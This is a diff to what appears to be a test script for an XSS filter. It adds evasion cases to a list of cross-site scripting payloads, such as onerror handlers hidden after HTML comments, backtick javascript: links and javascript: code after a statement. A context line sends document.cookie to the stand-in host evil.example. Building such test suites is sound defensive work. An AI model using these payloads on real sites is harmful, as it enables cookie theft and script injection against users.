@@ -100,6 +100,12 @@ q $A xss "case and whitespace evasion" "<ScRiPt >alert(1)</sCrIpT >"
 q $A xss "html entity evasion"         "<a href=\"&#106;avascript:alert(1)\">x</a>"
 q $A xss "document.cookie exfil"       "<script>fetch('//evil.example/'+document.cookie)</script>"
 q $A xss "template literal"            "<script>alert\`1\`</script>"
+# Aegolith: counter-cases for the inert-markup guards: real markup after a comment, a backtick attribute after a
+# comment backtick, a handler after an open comment backtick, and javascript: code after a statement (alpha.6).
+q $A xss "img onerror after comment"   "<!-- x --><img src=x onerror=alert(1)>"
+q $A xss "backtick href after comment" "<!-- \`x\` --><a href=\`javascript:alert(1)\`>x</a>"
+json $A xss "handler in open comment"  '{"note":"<!--` onerror=alert(1)"}'
+q $A xss "javascript call after stmt"  "javascript: a=1; alert (document.cookie)"
 json $A xss "stored xss in review"     '{"review":"<script>alert(1)</script>","rating":5}'
 json $A xss "xss in address field"     '{"address_line1":"<img src=x onerror=alert(1)>"}'
 hdr $A xss "xss in referer"            Referer "<script>alert(1)</script>"
